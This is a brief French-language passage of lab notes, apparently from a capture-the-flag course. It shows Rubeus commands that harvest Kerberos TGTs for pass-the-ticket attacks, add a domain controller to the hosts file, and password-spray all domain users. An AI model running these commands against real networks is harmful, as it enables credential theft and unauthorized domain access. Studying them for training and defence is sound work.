## Harvesting

La récolte rassemble les tickets qui sont transférés vers le KDC et les enregistre pour les utiliser dans d'autres attaques telles que l'attaque par passe le ticket.

Cette commande indique à Rubeus de récolter des TGT toutes les 30 secondes

```sh
C:\Users\Administrator> Rubeus.exe harvest /interval:30
```

## Password Spraying

Avant de pulvériser le mot de passe avec Rubeus, vous devez ajouter le nom de domaine du contrôleur de domaine au fichier hôte Windows.

```sh
C:\Users\Administrator> echo 10.10.x.x CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

C:\Users\Administrator> Rubeus.exe brute /password:YOUR_PASSWORD /noticket
```

Cela prendra `YOUR_PASSWORD` et le "pulvérisera" contre tous les utilisateurs trouvés, puis donnera le `.kirbi` TGT pour cet utilisateur

> Soyez attentif à la manière dont vous utilisez cette attaque, car elle peut vous bloquer l’accès au réseau en fonction des politiques de verrouillage de compte.